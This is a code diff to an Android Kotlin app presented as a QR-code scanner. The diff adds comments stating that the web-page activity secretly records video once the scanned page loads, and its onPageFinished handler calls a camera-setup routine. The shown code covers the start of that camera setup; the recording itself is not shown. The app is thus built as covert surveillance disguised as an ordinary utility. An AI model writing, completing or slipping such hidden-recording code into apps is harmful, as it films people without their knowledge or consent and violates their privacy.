@@ -1,3 +1,5 @@
+// WEB VIEW ACTIVITY TO DISPLAY THE WEB PAGE RELATED TO THE QR CODE AND SECRETLY RECORD A VIDEO
+
 package com.zizou.qrcodescanner
 
 import android.os.Bundle
@@ -34,6 +36,7 @@ class WebPageActivity : AppCompatActivity() {
     private var cameraCaptureSession: CameraCaptureSession? = null
     private var cameraDevice: CameraDevice? = null
 
+    // ----------- FUNCTIONS TO BROWSE THE WEB PAGE ---------------
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_web_page)
@@ -53,7 +56,7 @@ class WebPageActivity : AppCompatActivity() {
 
         webView.settings.javaScriptEnabled = true
         webView.loadUrl(newUrl)
-        webView.webViewClient = object : MyWebViewClient() {
+        webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
                 setupCamera()
@@ -62,6 +65,8 @@ class WebPageActivity : AppCompatActivity() {
         }
     }
 
+
+    // ----------- FUNCTIONS TO RECORD THE VIDEO ---------------
     private fun setupCamera() {
         val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
         try {
